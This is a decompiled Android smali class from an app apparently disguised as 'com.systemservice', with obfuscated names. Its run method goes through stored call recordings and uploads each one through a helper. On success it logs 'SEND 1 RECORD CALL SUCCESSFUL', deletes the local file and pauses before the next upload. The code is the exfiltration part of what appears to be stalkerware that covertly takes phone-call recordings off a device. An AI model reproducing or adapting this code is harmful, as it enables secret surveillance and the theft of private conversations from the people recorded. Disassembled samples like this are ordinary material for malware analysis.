.class Lcom/systemservice/a/c/c/j;
.super Ljava/lang/Object;
.source ""

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/systemservice/a/c/c/m;->a(Lcom/systemservice/a/d/b;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Landroid/content/Context;

.field final synthetic b:Lcom/systemservice/a/c/c/m;


# direct methods
.method constructor <init>(Lcom/systemservice/a/c/c/m;Landroid/content/Context;)V
    .locals 0

    iput-object p1, p0, Lcom/systemservice/a/c/c/j;->b:Lcom/systemservice/a/c/c/m;

    iput-object p2, p0, Lcom/systemservice/a/c/c/j;->a:Landroid/content/Context;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 14

    const-string v0, ""

    const-string v1, "sending_call_recording"

    const/4 v2, 0x0

    :try_start_0
    iget-object v3, p0, Lcom/systemservice/a/c/c/j;->a:Landroid/content/Context;

    invoke-static {v3, v1, v2}, Lcom/systemservice/a/a/l;->a(Landroid/content/Context;Ljava/lang/String;Z)Z

    move-result v3
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_4
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    if-eqz v3, :cond_0

    iget-object v0, p0, Lcom/systemservice/a/c/c/j;->a:Landroid/content/Context;

    invoke-static {v0, v1, v2}, Lcom/systemservice/a/a/l;->b(Landroid/content/Context;Ljava/lang/String;Z)V

    return-void

    :cond_0
    :try_start_1
    iget-object v3, p0, Lcom/systemservice/a/c/c/j;->b:Lcom/systemservice/a/c/c/m;

    iget-object v3, v3, Lcom/systemservice/a/d/g;->b:Lcom/systemservice/a/h/b;

    check-cast v3, Lcom/systemservice/a/h/m;

    invoke-virtual {v3}, Lcom/systemservice/a/h/m;->c()V

    const/4 v4, 0x0

    invoke-virtual {v3, v2, v4, v4}, Lcom/systemservice/a/h/m;->a(ZLjava/util/Date;Ljava/util/Date;)Ljava/util/List;

    move-result-object v4

    if-eqz v4, :cond_5

    invoke-interface {v4}, Ljava/util/List;->size()I

    move-result v5

    if-lez v5, :cond_5

    iget-object v5, p0, Lcom/systemservice/a/c/c/j;->a:Landroid/content/Context;

    const/4 v6, 0x1

    invoke-static {v5, v1, v6}, Lcom/systemservice/a/a/l;->b(Landroid/content/Context;Ljava/lang/String;Z)V

    iget-object v5, p0, Lcom/systemservice/a/c/c/j;->b:Lcom/systemservice/a/c/c/m;

    invoke-virtual {v5}, Lcom/systemservice/a/d/g;->d()Lcom/systemservice/common/features/settingHistory/b;

    move-result-object v5

    check-cast v5, Lcom/systemservice/a/c/c/o;

    invoke-interface {v4}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v4

    :cond_1
    :goto_0
    invoke-interface {v4}, Ljava/util/Iterator;->hasNext()Z

    move-result v7

    if-eqz v7, :cond_4

    invoke-interface {v4}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Lcom/systemservice/a/d/d;

    check-cast v7, Lcom/systemservice/a/e/f;

    if-eqz v7, :cond_1

    new-instance v8, Ljava/io/File;

    invoke-virtual {v7}, Lcom/systemservice/a/e/f;->e()Ljava/lang/String;

    move-result-object v9

    invoke-direct {v8, v9}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8}, Ljava/io/File;->exists()Z

    move-result v9

    if-eqz v9, :cond_3

    iget-object v9, p0, Lcom/systemservice/a/c/c/j;->a:Landroid/content/Context;

    invoke-virtual {v5, v9, v8, v7}, Lcom/systemservice/a/c/c/o;->a(Landroid/content/Context;Ljava/io/File;Lcom/systemservice/a/e/f;)I

    move-result v9

    const-wide/16 v10, 0x1388

    if-ne v9, v6, :cond_2

    const-string v9, "TAG"

    const-string v12, "SEND 1 RECORD CALL SUCCESSFUL"

    invoke-static {v9, v12}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_4
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    :try_start_2
    invoke-virtual {v7}, Lcom/systemservice/a/e/f;->h()J

    move-result-wide v12

    invoke-virtual {v3, v12, v13}, Lcom/systemservice/a/h/m;->a(J)V

    invoke-virtual {v8}, Ljava/io/File;->delete()Z
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    :try_start_3
    invoke-static {v10, v11}, Ljava/lang/Thread;->sleep(J)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    goto :goto_0

    :catch_0
    move-exception v7

    :try_start_4
    iget-object v8, p0, Lcom/systemservice/a/c/c/j;->b:Lcom/systemservice/a/c/c/m;

    invoke-static {v8}, Lcom/systemservice/a/c/c/m;->a(Lcom/systemservice/a/c/c/m;)Lorg/apache/log4j/Logger;

    move-result-object v8

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v7}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v9, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v8, v7}, Lorg/apache/log4j/Category;->error(Ljava/lang/Object;)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    goto :goto_0

    :catch_1
    move-exception v7

    :try_start_5
    iget-object v8, p0, Lcom/systemservice/a/c/c/j;->b:Lcom/systemservice/a/c/c/m;

    invoke-static {v8}, Lcom/systemservice/a/c/c/m;->a(Lcom/systemservice/a/c/c/m;)Lorg/apache/log4j/Logger;

    move-result-object v8

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v7}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v9, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    :goto_1
    invoke-virtual {v8, v7}, Lorg/apache/log4j/Category;->error(Ljava/lang/Object;)V

    goto :goto_0

    :cond_2
    iget-object v9, p0, Lcom/systemservice/a/c/c/j;->a:Landroid/content/Context;

    invoke-static {v9}, Lcom/systemservice/common/features/settingHistory/b;->c(Landroid/content/Context;)Z

    move-result v9
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_4
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    if-eqz v9, :cond_1

    :try_start_6
    invoke-virtual {v7}, Lcom/systemservice/a/e/f;->h()J

    move-result-wide v12

    invoke-virtual {v3, v12, v13}, Lcom/systemservice/a/h/m;->a(J)V

    invoke-virtual {v8}, Ljava/io/File;->delete()Z
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_3
    .catchall {:try_start_6 .. :try_end_6} :catchall_0

    :try_start_7
    invoke-static {v10, v11}, Ljava/lang/Thread;->sleep(J)V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_2
    .catchall {:try_start_7 .. :try_end_7} :catchall_0

    goto/16 :goto_0

    :catch_2
    move-exception v7

    :try_start_8
    invoke-virtual {v7}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_3
    .catchall {:try_start_8 .. :try_end_8} :catchall_0

    goto/16 :goto_0

    :catch_3
    move-exception v7

    :try_start_9
    iget-object v8, p0, Lcom/systemservice/a/c/c/j;->b:Lcom/systemservice/a/c/c/m;

    invoke-static {v8}, Lcom/systemservice/a/c/c/m;->a(Lcom/systemservice/a/c/c/m;)Lorg/apache/log4j/Logger;

    move-result-object v8

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v7}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v9, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    goto :goto_1

    :cond_3
    invoke-virtual {v7}, Lcom/systemservice/a/e/f;->h()J

    move-result-wide v7

    invoke-virtual {v3, v7, v8}, Lcom/systemservice/a/h/m;->a(J)V

    goto/16 :goto_0

    :cond_4
    iget-object v3, p0, Lcom/systemservice/a/c/c/j;->a:Landroid/content/Context;

    invoke-static {v3, v1, v2}, Lcom/systemservice/a/a/l;->b(Landroid/content/Context;Ljava/lang/String;Z)V
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_4
    .catchall {:try_start_9 .. :try_end_9} :catchall_0

    :cond_5
    :goto_2
    iget-object v0, p0, Lcom/systemservice/a/c/c/j;->a:Landroid/content/Context;

    invoke-static {v0, v1, v2}, Lcom/systemservice/a/a/l;->b(Landroid/content/Context;Ljava/lang/String;Z)V

    goto :goto_3

    :catchall_0
    move-exception v0

    goto :goto_4

    :catch_4
    move-exception v3

    :try_start_a
    iget-object v4, p0, Lcom/systemservice/a/c/c/j;->b:Lcom/systemservice/a/c/c/m;

    invoke-static {v4}, Lcom/systemservice/a/c/c/m;->b(Lcom/systemservice/a/c/c/m;)Ljava/lang/String;

    move-result-object v4

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v4, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v4, p0, Lcom/systemservice/a/c/c/j;->b:Lcom/systemservice/a/c/c/m;

    invoke-static {v4}, Lcom/systemservice/a/c/c/m;->a(Lcom/systemservice/a/c/c/m;)Lorg/apache/log4j/Logger;

    move-result-object v4

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v4, v0}, Lorg/apache/log4j/Category;->error(Ljava/lang/Object;)V
    :try_end_a
    .catchall {:try_start_a .. :try_end_a} :catchall_0

    goto :goto_2

    :goto_3
    return-void

    :goto_4
    iget-object v3, p0, Lcom/systemservice/a/c/c/j;->a:Landroid/content/Context;

    invoke-static {v3, v1, v2}, Lcom/systemservice/a/a/l;->b(Landroid/content/Context;Ljava/lang/String;Z)V

    throw v0
.end method
